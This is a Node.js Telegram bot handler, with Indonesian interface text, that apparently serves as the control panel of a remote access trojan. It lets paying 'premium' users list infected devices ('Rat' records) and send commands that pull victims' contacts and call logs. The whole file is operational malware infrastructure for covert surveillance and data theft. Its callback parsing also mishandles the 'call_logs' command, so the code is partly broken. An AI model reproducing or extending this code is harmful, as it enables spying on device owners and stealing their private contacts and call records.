const User = require('../models/user');
const Rat = require('../models/rat');
const { sendAwanStartMessage, createInlineKeyboard } = require('../utils');

// Helper function to list devices for a command
async function listDevicesForCommand(bot, chatId, command) {
    const rats = await Rat.find({ chatId });

    if (rats.length === 0) {
        return bot.sendMessage(chatId, 'Tidak ada perangkat yang terhubung.');
    }

    const buttons = rats.map(rat => ({
        text: rat.deviceId,
        callback_data: `awan_cmd_${command}_${rat.deviceId}`
    }));

    buttons.push({ text: 'Batal', callback_data: 'awan_premium_menu' });

    bot.sendMessage(chatId, `Pilih perangkat untuk mengirim perintah \`${command}\`:`, {
        parse_mode: 'Markdown',
        reply_markup: createInlineKeyboard(buttons)
    });
}

// Helper function to send command to device
async function sendCommandToDevice(bot, query, command, deviceId) {
    const chatId = query.message.chat.id;
    try {
        const rat = await Rat.findOne({ deviceId: deviceId, chatId: chatId });
        if (!rat) {
            return bot.answerCallbackQuery(query.id, { text: 'Perangkat tidak ditemukan.', show_alert: true });
        }

        rat.pendingCommand = command;
        await rat.save();

        bot.editMessageText(`✅ Perintah \`${command}\` telah dikirim ke perangkat \`${deviceId}\`. Harap tunggu perangkat merespons.`, {
            chat_id: chatId,
            message_id: query.message.message_id
        });

    } catch (error) {
        console.error(`Error sending command ${command} to ${deviceId}:`, error);
        bot.answerCallbackQuery(query.id, { text: 'Gagal mengirim perintah.', show_alert: true });
    }
}


module.exports = {
    name: 'awan_premium',
    execute: async (bot, query) => {
        const chatId = query.message.chat.id;
        const data = query.data;

        try {
            const user = await User.findOne({ chatId });
            if (!user || !user.isPremium) {
                return bot.answerCallbackQuery(query.id, {
                    text: 'Fitur ini hanya untuk pengguna premium.',
                    show_alert: true
                });
            }

            // Route to different handlers based on callback data
            if (data === 'awan_premium_menu') {
                await bot.deleteMessage(chatId, query.message.message_id);
                sendAwanStartMessage(bot, chatId);
            } else if (data === 'awan_list_devices') {
                const rats = await Rat.find({ chatId });
                let message = '*Perangkat Terhubung:*\n\n';
                if (rats.length === 0) {
                    message = 'Tidak ada perangkat yang terhubung saat ini.';
                } else {
                    rats.forEach(rat => {
                        message += `- \`${rat.deviceId}\` (Terakhir dilihat: ${rat.lastSeen.toLocaleString()})\n`;
                    });
                }
                bot.editMessageText(message, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'Markdown',
                    reply_markup: createInlineKeyboard([{ text: 'Kembali', callback_data: 'awan_premium_menu' }])
                });
            } else if (data === 'awan_get_contacts') {
                await listDevicesForCommand(bot, chatId, 'contacts');
            } else if (data === 'awan_get_call_logs') {
                await listDevicesForCommand(bot, chatId, 'call_logs');
            } else if (data.startsWith('awan_cmd_')) {
                // Format: awan_cmd_<command>_<deviceId>
                const parts = data.split('_');
                const command = parts[2];
                const deviceId = parts[3];
                await sendCommandToDevice(bot, query, `get_${command}`, deviceId);
            } else if (data === 'back_to_start') {
                 // Logic to go back to the main menu
                 // This requires the sendStartMessage function and user details
                 await bot.deleteMessage(chatId, query.message.message_id);
                 const { sendStartMessage, isAdmin } = require('../utils');
                 sendStartMessage(bot, chatId, isAdmin(chatId), false, user.isPremium);
            }


            bot.answerCallbackQuery(query.id);

        } catch (error) {
            console.error('Error in awan_premium command:', error);
            bot.answerCallbackQuery(query.id, {
                text: 'Terjadi kesalahan.',
                show_alert: true
            });
        }
    }
};
